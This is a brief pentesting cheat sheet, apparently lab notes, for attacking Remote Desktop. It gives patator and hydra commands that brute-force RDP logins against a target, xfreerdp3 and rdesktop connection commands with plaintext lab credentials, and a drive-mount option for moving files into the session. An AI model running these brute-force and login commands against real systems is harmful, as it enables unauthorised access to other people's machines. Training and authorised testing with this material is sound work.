## RDP BRUTE FORCE
### PATATOR
```bash
sudo patator rdp_login host=$ip user=FILE0 password=FILE1 0=./users 1=./passwords -x ignore:code=134
```
## HYDRA
```bash
sudo hydra -f -V -l Administrator -P passwords.txt rdp://$ip
```
## RDP TO THE MACHINE WITH CREDS
```bash
sudo xfreerdp3 /u:user /p:password321 /cert:ignore /v:10.10.252.226 +clipboard /dynamic-resolution
```
## RDP - DOMAIN
```bash
sudo xfreerdp3 /u:bitbucket /d:LAB.ENTERPRISE.THM /v:$ip /p:littleredbucket /cert:ignore +clipboard /dynamic-resolution 
```
## RDESKTOP
```bash
sudo rdesktop $ip
```
## MOUNT A SHARE TO THE RDP SESSION
```bash
sudo xfreerdp3 /u:bitbucket /d:LAB.ENTERPRISE.THM /v:$ip /p:littleredbucket /cert:ignore +clipboard /dynamic-resolution /drive:.,kali

# Access the share from the rdp machine
\\192.168.100.10\kali
```
